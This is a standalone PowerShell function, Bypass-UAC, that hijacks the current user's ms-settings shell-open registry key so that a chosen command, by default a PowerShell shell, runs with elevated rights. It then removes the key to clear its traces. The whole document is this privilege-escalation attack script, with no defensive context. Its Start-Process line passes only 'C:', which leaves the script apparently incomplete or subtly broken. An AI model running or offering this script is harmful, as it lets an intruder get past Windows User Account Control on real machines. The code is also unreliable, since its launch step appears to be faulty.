function Bypass-UAC() {
  param(
    [String]$ExecutablePath = "cmd /c powershell.exe"
  )

  New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force
  New-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
  Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $ExecutablePath -Force

  Start-Process "C:"

  Start-Sleep 5
  Remove-Item "HKCU:\SOFTWARE\Classes\ms-settings\" -Recurse -Force
}
